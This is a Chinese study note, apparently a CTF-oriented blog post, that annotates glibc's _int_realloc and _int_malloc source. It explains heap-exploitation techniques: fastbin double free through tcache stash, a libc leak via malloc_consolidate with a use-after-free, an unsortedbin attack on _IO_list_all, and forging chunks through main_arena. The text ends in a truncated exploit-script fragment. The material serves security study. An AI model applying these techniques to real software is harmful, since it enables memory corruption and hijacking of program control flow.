//前面已经处理干净了mmap分配的内存块 这里检查一下 next = chunk_at_offset (oldp, oldsize); //获取下一个内存块 INTERNAL_SIZE_T nextsize = chunksize (next); //获取下一个内存块的大小 if (__builtin_expect (chunksize_nomask (next) &lt;= CHUNK_HDR_SZ, 0) //检查下一个内存块的大小是否小于等于chunk头大小 || __builtin_expect (nextsize &gt;= av-&gt;system_mem, 0)) //检查下一个内存块的大小是否大于等于系统内存总量 malloc_printerr (&quot;realloc(): invalid next size&quot;); if ((unsigned long) (oldsize) &gt;= (unsigned long) (nb)) //检查oldsize是否大于等于nb &#123; /* already big enough; split below */ newp = oldp; //如果oldsize大于重分配的size 就不重新申请chunk 而是切割oldp newsize = oldsize; &#125; else &#123; /* Try to expand forward into top */ if (next == av-&gt;top &amp;&amp; //如果下一个chunk是top chunk 就扩展oldp (unsigned long) (newsize = oldsize + nextsize) &gt;= (unsigned long) (nb + MINSIZE)) &#123; set_head_size (oldp, nb | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); av-&gt;top = chunk_at_offset (oldp, nb); set_head (av-&gt;top, (newsize - nb) | PREV_INUSE); check_inuse_chunk (av, oldp); return tag_new_usable (chunk2mem (oldp)); &#125; /* Try to expand forward into next chunk; split off remainder below */ else if (next != av-&gt;top &amp;&amp; //如果下一个chunk(free状态)的大小和oldpsize加起来大于等于nb 就合并oldp和nextchunk 然后重分配 !inuse (next) &amp;&amp; (unsigned long) (newsize = oldsize + nextsize) &gt;= (unsigned long) (nb)) &#123; newp = oldp; unlink_chunk (av, next); &#125; /* allocate, copy, free */ else //如果上述的特殊情况都不满足 就按照malloc-copy-free的流程来 &#123; newmem = _int_malloc (av, nb - MALLOC_ALIGN_MASK); if (newmem == 0) return 0; /* propagate failure */ newp = mem2chunk (newmem); newsize = chunksize (newp); /* Avoid copy if newp is next chunk after oldp. */ if (newp == next) //这里比较疑惑 用于检测newp是不是next chunk 如果是的话就按照合并oldp和next chunk算 但是正常来说 前面已经处理过这种情况了 &#123; newsize += oldsize; newp = oldp; &#125; else &#123; void *oldmem = chunk2mem (oldp); size_t sz = memsize (oldp); (void) tag_region (oldmem, sz); //标记旧内存区域 newmem = tag_new_usable (newmem); //标记新内存区域可用 memcpy (newmem, oldmem, sz); _int_free (av, oldp, 1); check_inuse_chunk (av, newp); return newmem; &#125; &#125; &#125; /* If possible, free extra space in old or extended chunk */ assert ((unsigned long) (newsize) &gt;= (unsigned long) (nb)); //判断重分配后的chunk大小是否大于需要分配的大小 即检测是否有多余的空间 remainder_size = newsize - nb; if (remainder_size &lt; MINSIZE) /* not enough extra to split off */ &#123; //如果剩余的空间小于最小的chunk大小 那么就设置一些chunk的基础信息然后返回 set_head_size (newp, newsize | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_inuse_bit_at_offset (newp, newsize); &#125; else /* split remainder */ &#123; //相反 如果有多余的空间 就切割出来为新的chunk remainder = chunk_at_offset (newp, nb); /* Clear any user-space tags before writing the header. */ remainder = tag_region (remainder, remainder_size); set_head_size (newp, nb | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); /* Mark remainder as inuse so free() won&#x27;t complain */ set_inuse_bit_at_offset (remainder, remainder_size); _int_free (av, remainder, 1); &#125; check_inuse_chunk (av, newp); return tag_new_usable (chunk2mem (newp));&#125; int_realloc的主要逻辑都是通过下面这个if分支来 这里着重来分析一波 else //如果上述的特殊情况都不满足 就按照malloc-copy-free的流程来 &#123; newmem = _int_malloc (av, nb - MALLOC_ALIGN_MASK); if (newmem == 0) return 0; /* propagate failure */ newp = mem2chunk (newmem); newsize = chunksize (newp); /* Avoid copy if newp is next chunk after oldp. */ if (newp == next) //这里比较疑惑 用于检测newp是不是next chunk 如果是的话就按照合并oldp和next chunk算 但是正常来说 前面已经处理过这种情况了 &#123; newsize += oldsize; newp = oldp; &#125; else &#123; void *oldmem = chunk2mem (oldp); size_t sz = memsize (oldp); (void) tag_region (oldmem, sz); //标记旧内存区域 newmem = tag_new_usable (newmem); //标记新内存区域可用 memcpy (newmem, oldmem, sz); _int_free (av, oldp, 1); check_inuse_chunk (av, newp); return newmem; &#125; &#125; 开头先调用int_malloc(注意 这里是int_malloc 正如realloc一样 malloc也有int和libc两种形式 一般我们通过程序调用的是libc_malloc 所以就会出现 之前发现的明明tcachebin中有合适的chunk 但是却不会申请到了 具体是哪里的分支绕走了 又如何解决 还需要接着往下分析)接下来进行了一个check 检测new_chunk就是next_chunk 但是在此之前 已经单独对next_chunk是否可以用来扩展old_chunk做了判断 这里的if是为了避免int_malloc后 next_chunk变得可用了 而做的异常处理 不过这是为了防止啥样的特殊情况 我也想象不出来 希望在阅读int_malloc后能够得到结论然后就是标准的copy-free了 由于free在实验过程中没有出现特别显著的问题 所以就先不看int_free的源码了 来看看int_malloc和libc_malloc有什么不同 static void *_int_malloc (mstate av, size_t bytes)&#123; INTERNAL_SIZE_T nb; /* normalized request size */ unsigned int idx; /* associated bin index */ mbinptr bin; /* associated bin */ mchunkptr victim; /* inspected/selected chunk */ INTERNAL_SIZE_T size; /* its size */ int victim_index; /* its bin index */ mchunkptr remainder; /* remainder from a split */ unsigned long remainder_size; /* its size */ unsigned int block; /* bit map traverser */ unsigned int bit; /* bit map traverser */ unsigned int map; /* current word of binmap */ mchunkptr fwd; /* misc temp for linking */ mchunkptr bck; /* misc temp for linking */#if USE_TCACHE size_t tcache_unsorted_count; /* count of unsorted chunks processed */#endif /* Convert request size to internal form by adding SIZE_SZ bytes overhead plus possibly more to obtain necessary alignment and/or to obtain a size of at least MINSIZE, the smallest allocatable size. Also, checked_request2size returns false for request sizes that are so large that they wrap around zero when padded and aligned. */ if (!checked_request2size (bytes, &amp;nb)) //将请求的内存大小bytes加上chunk的头部大小 &#123; __set_errno (ENOMEM); return NULL; &#125; /* There are no usable arenas. Fall back to sysmalloc to get a chunk from mmap. */ if (__glibc_unlikely (av == NULL)) //如果没有可用的内存分配区 调用sysmalloc通过mmap分配 &#123; void *p = sysmalloc (nb, av); if (p != NULL) alloc_perturb (p, bytes); return p; &#125; /* If the size qualifies as a fastbin, first check corresponding bin. This code is safe to execute even if av is not yet initialized, so we can try it without checking, which saves some time on this fast path. */#define REMOVE_FB(fb, victim, pp) \\ do \\ &#123; \\ //从fastbin中取出chunk victim = pp; \\ if (victim == NULL) \\ break; \\ pp = REVEAL_PTR (victim-&gt;fd); \\ if (__glibc_unlikely (pp != NULL &amp;&amp; misaligned_chunk (pp))) \\ //安全性检查 判断指针是否为空 是否对齐 malloc_printerr (&quot;malloc(): unaligned fastbin chunk detected&quot;); \\ &#125; \\ while ((pp = catomic_compare_and_exchange_val_acq (fb, pp, victim)) \\ != victim); \\ if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ())) //判断请求的大小是否处于fastbin的范围内 &#123; idx = fastbin_index (nb); mfastbinptr *fb = &amp;fastbin (av, idx); //获取fastbin链表头 mchunkptr pp; victim = *fb; if (victim != NULL) &#123; if (__glibc_unlikely (misaligned_chunk (victim))) malloc_printerr (&quot;malloc(): unaligned fastbin chunk detected 2&quot;); if (SINGLE_THREAD_P) *fb = REVEAL_PTR (victim-&gt;fd); else REMOVE_FB (fb, pp, victim); //多线程时从fastbin中取出chunk if (__glibc_likely (victim != NULL)) //安全性检查 &#123; size_t victim_idx = fastbin_index (chunksize (victim)); if (__builtin_expect (victim_idx != idx, 0)) malloc_printerr (&quot;malloc(): memory corruption (fast)&quot;); check_remalloced_chunk (av, victim, nb);#if USE_TCACHE //这一部分就是以前学过的tcache stash机制 在fastbin中申请chunk后 如果链表中还有free chunk 就会把这些chunk放到tcachebin中 /* While we&#x27;re here, if we see other chunks of the same size, stash them in the tcache. */ size_t tc_idx = csize2tidx (nb); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) &#123; mchunkptr tc_victim; /* While bin not empty and tcache not full, copy chunks. */ while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count //如果tcache对应size的链表还有空余 就转移chunk &amp;&amp; (tc_victim = *fb) != NULL) &#123; if (__glibc_unlikely (misaligned_chunk (tc_victim))) malloc_printerr (&quot;malloc(): unaligned fastbin chunk detected 3&quot;); if (SINGLE_THREAD_P) *fb = REVEAL_PTR (tc_victim-&gt;fd); else &#123; REMOVE_FB (fb, pp, tc_victim); if (__glibc_unlikely (tc_victim == NULL)) break; &#125; tcache_put (tc_victim, tc_idx); &#125; &#125;#endif void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; &#125; &#125; /* If a small request, check regular bin. Since these &quot;smallbins&quot; hold one size each, no searching within bins is necessary. (For a large request, we need to wait until unsorted chunks are processed to find best fit. But for small ones, fits are exact anyway, so we can check now, which is faster.) */ //先在smallbin中查询可用chunk 因为smallbin链表类似tcachebin 每个size都有一个链表 查询起来速度快 if (in_smallbin_range (nb)) &#123; idx = smallbin_index (nb); bin = bin_at (av, idx); //获取smallbin的链表头 if ((victim = last (bin)) != bin) &#123; bck = victim-&gt;bk; //取链表的最后一个chunk的上一个chunk if (__glibc_unlikely (bck-&gt;fd != victim)) //安全性检查 如果bck的下一个chunk不是victim 说明链表被破坏 malloc_printerr (&quot;malloc(): smallbin double linked list corrupted&quot;); set_inuse_bit_at_offset (victim, nb); bin-&gt;bk = bck; //将链表中的最后一个chunk拿去使用 随后恢复链表结构 bck-&gt;fd = bin; if (av != &amp;main_arena) //如果分配区不是main_arena 设置chunk的arena为非main_arena set_non_main_arena (victim); check_malloced_chunk (av, victim, nb);#if USE_TCACHE //和fastbin中一样 如果smallbin中链表还有其他free chunk 且符合tcachebin的范围 同时tcachebin中有空闲位置 就全部放到tcachebin中 /* While we&#x27;re here, if we see other chunks of the same size, stash them in the tcache. */ size_t tc_idx = csize2tidx (nb); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) &#123; mchunkptr tc_victim; /* While bin not empty and tcache not full, copy chunks over. */ while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = last (bin)) != bin) &#123; if (tc_victim != 0) &#123; bck = tc_victim-&gt;bk; set_inuse_bit_at_offset (tc_victim, nb); if (av != &amp;main_arena) set_non_main_arena (tc_victim); bin-&gt;bk = bck; bck-&gt;fd = bin; tcache_put (tc_victim, tc_idx); &#125; &#125; &#125;#endif void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; &#125; /* If this is a large request, consolidate fastbins before continuing. While it might look excessive to kill all fastbins before even seeing if there is space available, this avoids fragmentation problems normally associated with fastbins. Also, in practice, programs tend to have runs of either small or large requests, but less often mixtures, so consolidation is not invoked all that often in most programs. And the programs that it is called frequently in otherwise tend to fragment. */ else &#123; //如果是从largebin中分配 就会触发malloc_consolidate来合并chunk 这个以前也有学过 idx = largebin_index (nb); if (atomic_load_relaxed (&amp;av-&gt;have_fastchunks)) malloc_consolidate (av); &#125; /* Process recently freed or remaindered chunks, taking one only if it is exact fit, or, if this a small request, the chunk is remainder from the most recent non-exact fit. Place other traversed chunks in bins. Note that this step is the only place in any routine where chunks are placed in bins. The outer loop here is needed because we might not realize until near the end of malloc that we should have consolidated, so must do so and retry. This happens at most once, and only when we would otherwise need to expand memory to service a &quot;small&quot; request. */#if USE_TCACHE INTERNAL_SIZE_T tcache_nb = 0; size_t tc_idx = csize2tidx (nb); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) //判断请求大小是否属于tcachebin的范围 tcache_nb = nb; int return_cached = 0; tcache_unsorted_count = 0;#endif for (;; ) &#123; int iters = 0; //判断链表头的上一个chunk是否为链表头本身 如果是 那么链表中无空闲chunk 不进入while循环 while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) &#123; bck = victim-&gt;bk; //获取链表中的最后一个chunk size = chunksize (victim); mchunkptr next = chunk_at_offset (victim, size); //获取victim下一个相邻chunk的地址 if (__glibc_unlikely (size &lt;= CHUNK_HDR_SZ) //安全性检查 || __glibc_unlikely (size &gt; av-&gt;system_mem)) malloc_printerr (&quot;malloc(): invalid size (unsorted)&quot;); if (__glibc_unlikely (chunksize_nomask (next) &lt; CHUNK_HDR_SZ) //检查下一个chunk的size是否符合要求 || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem)) malloc_printerr (&quot;malloc(): invalid next size (unsorted)&quot;); if (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size)) //检查next_chunk的prev_size是否正确 malloc_printerr (&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;); if (__glibc_unlikely (bck-&gt;fd != victim) //检查链表结构 || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av))) malloc_printerr (&quot;malloc(): unsorted double linked list corrupted&quot;); if (__glibc_unlikely (prev_inuse (next))) //检查next_chunk的prev_inuse位是否为0 malloc_printerr (&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;); /* If a small request, try to use last remainder if it is the only chunk in unsorted bin. This helps promote locality for runs of consecutive small requests. This is the only exception to best-fit, and applies only when there is no exact fit for a small chunk. */ if (in_smallbin_range (nb) &amp;&amp; //如果请求大小属于small chunk 同时victim的size大于申请的size bck == unsorted_chunks (av) &amp;&amp; //这一点要注意 check的是bck和main_arena中对应链表的指针 如果是通过填满tcache来把chunk释放进入unsortedbin的方式 还需要先随便申请一个小chunk才能触发这个if分支 具体原因就是第一次申请chunk的时候 unsorted_chunks(av)的值为0 victim == av-&gt;last_remainder &amp;&amp; (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE)) &#123; /* split and reattach remainder */ remainder_size = size - nb; //从剩余的空间中分割chunk remainder = chunk_at_offset (victim, nb); unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder; av-&gt;last_remainder = remainder; remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av); if (!in_smallbin_range (remainder_size)) &#123; remainder-&gt;fd_nextsize = NULL; remainder-&gt;bk_nextsize = NULL; &#125; set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); set_foot (remainder, remainder_size); check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; /* remove from unsorted list */ if (__glibc_unlikely (bck-&gt;fd != victim)) //安全性检查 malloc_printerr (&quot;malloc(): corrupted unsorted chunks 3&quot;); unsorted_chunks (av)-&gt;bk = bck; bck-&gt;fd = unsorted_chunks (av); /* Take now instead of binning if exact fit */ if (size == nb) //如果申请的chunk大小和剩余的大小一致 就走这个分支 &#123; set_inuse_bit_at_offset (victim, size); if (av != &amp;main_arena) set_non_main_arena (victim);#if USE_TCACHE /* Fill cache first, return to user only if cache fills. We may return one of these chunks later. */ if (tcache_nb //如果有tcachebin 就先把这个chunk放到tcachebin中 &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) &#123; tcache_put (victim, tc_idx); return_cached = 1; continue; &#125; else &#123;#endif check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p;#if USE_TCACHE &#125;#endif &#125; /* place chunk in bin */ if (in_smallbin_range (size)) //这里根据chunk的大小来判断要放入smallbin还是largebin &#123; victim_index = smallbin_index (size); bck = bin_at (av, victim_index); fwd = bck-&gt;fd; &#125; else &#123; victim_index = largebin_index (size); bck = bin_at (av, victim_index); fwd = bck-&gt;fd; /* maintain large bins in sorted order */ //这一段是largebin按照大小排序的部分 if (fwd != bck) &#123; /* Or with inuse bit to speed comparisons */ size |= PREV_INUSE; /* if smaller than smallest, bypass loop below */ assert (chunk_main_arena (bck-&gt;bk)); if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk)) &#123; fwd = bck; bck = bck-&gt;bk; victim-&gt;fd_nextsize = fwd-&gt;fd; victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; &#125; else &#123; assert (chunk_main_arena (fwd)); while ((unsigned long) size &lt; chunksize_nomask (fwd)) &#123; fwd = fwd-&gt;fd_nextsize; assert (chunk_main_arena (fwd)); &#125; if ((unsigned long) size == (unsigned long) chunksize_nomask (fwd)) /* Always insert in the second position. */ fwd = fwd-&gt;fd; else &#123; victim-&gt;fd_nextsize = fwd; victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd)) malloc_printerr (&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;); fwd-&gt;bk_nextsize = victim; victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; &#125; bck = fwd-&gt;bk; if (bck-&gt;fd != fwd) malloc_printerr (&quot;malloc(): largebin double linked list corrupted (bk)&quot;); &#125; &#125; else victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim; &#125; mark_bin (av, victim_index); victim-&gt;bk = bck; victim-&gt;fd = fwd; fwd-&gt;bk = victim; bck-&gt;fd = victim;#if USE_TCACHE /* If we&#x27;ve processed as many chunks as we&#x27;re allowed while filling the cache, return one of the cached ones. */ ++tcache_unsorted_count; //检查tcachebin链表中的chunk是否超过范围 if (return_cached &amp;&amp; mp_.tcache_unsorted_limit &gt; 0 &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit) &#123; return tcache_get (tc_idx); &#125;#endif#define MAX_ITERS 10000 if (++iters &gt;= MAX_ITERS) break; &#125;#if USE_TCACHE /* If all the small chunks we found ended up cached, return one now. */ if (return_cached) //如果之前把chunk放到tcachebin里面 这里取出来就可以了 &#123; return tcache_get (tc_idx); &#125;#endif /* If a large request, scan through the chunks of current bin in sorted order to find smallest that fits. Use the skip list for this. */ //如果申请的chunk大小在largebin的范围里 就扫描largebinchunk来查找最合适的chunk if (!in_smallbin_range (nb)) &#123; bin = bin_at (av, idx); /* skip scan if empty or largest chunk is too small */ if ((victim = first (bin)) != bin &amp;&amp; (unsigned long) chunksize_nomask (victim) &gt;= (unsigned long) (nb)) &#123; victim = victim-&gt;bk_nextsize; while (((unsigned long) (size = chunksize (victim)) &lt; (unsigned long) (nb))) victim = victim-&gt;bk_nextsize; /* Avoid removing the first entry for a size so that the skip list does not have to be rerouted. */ if (victim != last (bin) &amp;&amp; chunksize_nomask (victim) == chunksize_nomask (victim-&gt;fd)) victim = victim-&gt;fd; remainder_size = size - nb; unlink_chunk (av, victim); /* Exhaust */ if (remainder_size &lt; MINSIZE) &#123; set_inuse_bit_at_offset (victim, size); if (av != &amp;main_arena) set_non_main_arena (victim); &#125; /* Split */ else &#123; remainder = chunk_at_offset (victim, nb); /* We cannot assume the unsorted list is empty and therefore have to perform a complete insert here. */ bck = unsorted_chunks (av); fwd = bck-&gt;fd; if (__glibc_unlikely (fwd-&gt;bk != bck)) malloc_printerr (&quot;malloc(): corrupted unsorted chunks&quot;); remainder-&gt;bk = bck; remainder-&gt;fd = fwd; bck-&gt;fd = remainder; fwd-&gt;bk = remainder; if (!in_smallbin_range (remainder_size)) &#123; remainder-&gt;fd_nextsize = NULL; remainder-&gt;bk_nextsize = NULL; &#125; set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); set_foot (remainder, remainder_size); &#125; check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; &#125; /* Search for a chunk by scanning bins, starting with next largest bin. This search is strictly by best-fit; i.e., the smallest (with ties going to approximately the least recently used) chunk that fits is selected. The bitmap avoids needing to check that most blocks are nonempty. The particular case of skipping all bins during warm-up phases when no chunks have been returned yet is faster than it might look. */ ++idx; bin = bin_at (av, idx); //后面这一部分关于内存桶的 暂时没看懂 block = idx2block (idx); map = av-&gt;binmap[block]; bit = idx2bit (idx); for (;; ) &#123; /* Skip rest of block if there are no more set bits in this block. */ if (bit &gt; map || bit == 0) &#123; do &#123; if (++block &gt;= BINMAPSIZE) /* out of bins */ goto use_top; &#125; while ((map = av-&gt;binmap[block]) == 0); bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT)); bit = 1; &#125; /* Advance to bin with set bit. There must be one. */ while ((bit &amp; map) == 0) &#123; bin = next_bin (bin); bit &lt;&lt;= 1; assert (bit != 0); &#125; /* Inspect the bin. It is likely to be non-empty */ victim = last (bin); /* If a false alarm (empty bin), clear the bit. */ if (victim == bin) &#123; av-&gt;binmap[block] = map &amp;= ~bit; /* Write through */ bin = next_bin (bin); bit &lt;&lt;= 1; &#125; else &#123; size = chunksize (victim); /* We know the first chunk in this bin is big enough to use. */ assert ((unsigned long) (size) &gt;= (unsigned long) (nb)); remainder_size = size - nb; /* unlink */ unlink_chunk (av, victim); /* Exhaust */ if (remainder_size &lt; MINSIZE) &#123; set_inuse_bit_at_offset (victim, size); if (av != &amp;main_arena) set_non_main_arena (victim); &#125; /* Split */ else &#123; remainder = chunk_at_offset (victim, nb); /* We cannot assume the unsorted list is empty and therefore have to perform a complete insert here. */ bck = unsorted_chunks (av); fwd = bck-&gt;fd; if (__glibc_unlikely (fwd-&gt;bk != bck)) malloc_printerr (&quot;malloc(): corrupted unsorted chunks 2&quot;); remainder-&gt;bk = bck; remainder-&gt;fd = fwd; bck-&gt;fd = remainder; fwd-&gt;bk = remainder; /* advertise as last remainder */ if (in_smallbin_range (nb)) av-&gt;last_remainder = remainder; if (!in_smallbin_range (remainder_size)) &#123; remainder-&gt;fd_nextsize = NULL; remainder-&gt;bk_nextsize = NULL; &#125; set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); set_foot (remainder, remainder_size); &#125; check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; &#125; use_top: /* If large enough, split off the chunk bordering the end of memory (held in av-&gt;top). Note that this is in accord with the best-fit search rule. In effect, av-&gt;top is treated as larger (and thus less well fitting) than any other available chunk since it can be extended to be as large as necessary (up to system limitations). We require that av-&gt;top always exists (i.e., has size &gt;= MINSIZE) after initialization, so if it would otherwise be exhausted by current request, it is replenished. (The main reason for ensuring it exists is that we may need MINSIZE space to put in fenceposts in sysmalloc.) */ victim = av-&gt;top; size = chunksize (victim); if (__glibc_unlikely (size &gt; av-&gt;system_mem)) malloc_printerr (&quot;malloc(): corrupted top size&quot;); if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) &#123; remainder_size = size - nb; remainder = chunk_at_offset (victim, nb); av-&gt;top = remainder; set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; /* When we are using atomic ops to free fast chunks we can get here for all block sizes. */ else if (atomic_load_relaxed (&amp;av-&gt;have_fastchunks)) &#123; malloc_consolidate (av); /* restore original bin index */ if (in_smallbin_range (nb)) idx = smallbin_index (nb); else idx = largebin_index (nb); &#125; /* Otherwise, relay to handle system-dependent cases */ else &#123; void *p = sysmalloc (nb, av); if (p != NULL) alloc_perturb (p, bytes); return p; &#125; &#125;&#125; 这几百行代码读下来 感觉还是有点蒙蔽的 总结一下首先判断nb是否属于fastbin的范围 如果属于则获取fastbin对应链表的链表头 当链表中存在空闲chunk的时候 将chunk从fastbin链表中取出(遵从先进先出原则) 同时 如果开启了tcachebin机制 当tcachebin对应链表尚有空闲(一条链表默认最大存储7个chunk) 并且fastbin该链表中取出一个chunk后 仍有剩余 就会触发tcache stash机制 会将fastbin链表中的chunk转移到tcachebin中这一机制存在漏洞利用的可能 在glibc2.29以后 tcachebin针对double free进行了安全防护 当chunk被释放进入链表后 chunk的bk域就会被写入key key的值为堆地址去除后三位 攻击者需要更改key 才能实现double free 而fastbin对于double free的检查 只会比较上一次和这次释放的指针是否一致 所以就可以通过在fastbin中实现double free 然后触发tcache stash来将链表放到tcachebin中接着如果nb大小在smallbin的范围内 就遍历smallbin 因为smallbin的链表和fastbin tcachebin一样 每一个范围内的大小都有一个链表 查询起来更加快速 这一段代码同样引入了tcache stash机制 来确保内存申请的效率如果nb的大小在largebin的范围内 就会调用malloc_consolidata函数 这个函数会合并物理相邻的fastbin chunk 很多时候 这一个函数也会导致许多漏洞 比如此时两个物理相邻的fastbin chunkA和B 如果用户手里有UAF的权限 在触发malloc_consolidata之前 控制的只是一个fastbin chunk 触发只会 就会合并成smallbin chunk 此时chunk的fd和bk域就填充了libc真实地址 如果用户利用UAF漏洞 就可以泄露libc基址接下来的代码负责处理从unsortedbin中申请chunk 最为关键的就是如下这些check 这些check保证了攻击者不会构造unsortedbin chunk的fd域和bk域 从而实现任意地址申请chunk以及任意地址写 while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) &#123; bck = victim-&gt;bk; //获取链表中的倒数第二个chunk size = chunksize (victim); mchunkptr next = chunk_at_offset (victim, size); //获取victim下一个相邻chunk的地址 if (__glibc_unlikely (size &lt;= CHUNK_HDR_SZ) //安全性检查 || __glibc_unlikely (size &gt; av-&gt;system_mem)) malloc_printerr (&quot;malloc(): invalid size (unsorted)&quot;); if (__glibc_unlikely (chunksize_nomask (next) &lt; CHUNK_HDR_SZ) //检查下一个chunk的size是否符合要求 || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem)) malloc_printerr (&quot;malloc(): invalid next size (unsorted)&quot;); if (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size)) //检查next_chunk的prev_size是否正确 malloc_printerr (&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;); if (__glibc_unlikely (bck-&gt;fd != victim) //检查链表结构 || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av))) malloc_printerr (&quot;malloc(): unsorted double linked list corrupted&quot;); if (__glibc_unlikely (prev_inuse (next))) //检查next_chunk的prev_inuse位是否为0 malloc_printerr (&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;); unsorted_chunks(av)可以获取unsortedbin链表的链表头指针 当链表头的bk域指向自己 也就是链表中 链表头和链表尾都为同一个chunk的时候 说明这个链表中已经没有其他的chunk了 那么就不会进入while循环 这一个check看似简单 但是实际上起到了非常大的防御功能 我在伪造chunk时 就是无法绕过这一个check来跳过while循环第一个check 检查victim的size是否符合要求第二个和第三个check 检查victim物理相邻的chunk的size和prev_size是否符合要求第四个check 检查victim上一个chunk(bck)的fd域是否指向victim 确保链表的完整性第五个check 检查next_chunk的prev_size的inuse位 因为处于unsortedbin链表中的chunk肯定都是处于free状态的 如果inuse不为0 就触发报错同时 在从unsortedbin中申请chunk后 还会有两句负责完善chunk的fd域和bk域 从而确保链表连通性 /* remove from unsorted list */ if (__glibc_unlikely (bck-&gt;fd != victim)) //安全性检查 malloc_printerr (&quot;malloc(): corrupted unsorted chunks 3&quot;); unsorted_chunks (av)-&gt;bk = bck; bck-&gt;fd = unsorted_chunks (av); 这两句即是2.31版本以前的unsortedbin attack攻击手法所利用到的 通过覆盖unsortedbin chunk的bk域 将其修改为ptr_addr - 0x10 在执行到 bck-&gt;fd &#x3D; unsorted_chunks(av)时 就会往ptr_addr写入unsortedbin的链表头地址 配合io链就可以覆写IO_list_all 从而伪造io结构体 劫持程序执行流但是在2.31以后 作者优化了对unsortedbin chunk的链表检查 在不修改main_arena的情况下 已经无法实现任意地址写了 在后续的步骤3中 我将说明如何通过修改main_arena来实现任意地址申请的逻辑漏洞回到源代码中 如果要申请的chunk大小等于链表中的chunk大小 会先将符合要求的chunk转移到tcachebin中(如果对应链表尚有空闲) 随后在第二次执行时 由于链表已经为空不进入while循环 直接从tcachebin中申请chunk如果大小不一致 会根据unsortedbin中的chunk大小来判断要将chunk放入largebin还是smallbin 随后再进行分配 如果想要伪造一个fake chunk加入unsortedbin链表 并且实现利用realloc函数把这个fake chunk申请出来 就需要更改链表头chunk的bk域接下来 需要更改这个fake chunk的fd域 让其指向main_arena 同时要做好伪造 修改fake chunk的size域 以及其物理相邻的下一个chunk的chunk头信息也要做好伪造做好这些前置工作 还需要绕过的判断就是 如何不进入while循环 只要我们没有完善链表结构 程序就会一直认为 链表中还存在chunk 就一直遍历 报错是必然发生的事想要把fake chunk从链表中脱离出来 要解决的关键就是如下这个check victim = unsorted_chunks (av)-&gt;bk bck = victim-&gt;bk; if (__glibc_unlikely (bck-&gt;fd != victim) //检查链表结构 || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av))) malloc_printerr (&quot;malloc(): unsorted double linked list corrupted&quot;); victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av) Victim指向fake chunk bck指向fake chunk的bk域需要使得bck的fd域指向fake chunk 还需要使得fake chunk指向main_arena看似很容易满足 但是关键是下次进入while循环时 victim就会指向bck如果此时bck的bk域不等于main_arena 就会重新进入while循环 那么此时bck的链表结构又需要重新布置 并且进入死循环但是实际上这是不可能的 除非我们去申请的是main_arena 但是这仍然需要我们拥有更改main_arena的权限 这样才能绕过size和prevsize的检查那么既然必须更改main_arena 有没有更容易的篡改方案 首先把fake chunk的bk域改为指向unsorted_chunks(av) 那么while循环的check就可以绕过去了接下来则是需要绕过bck-&gt;fd &#x3D;&#x3D; victim这一条判断使得unsorted_chunks(av)指向victim 即修改main_arena+96+0x10处为vitcim bss_addr = elf.bss(0x300)add(0x500,&quot;aaaa&quot;)#0add(0x10,&quot;aaaa&quot;)#1add(0x10,&quot;aaaa&quot;)#2delete(1)delete(2)show(1)heap_addr = 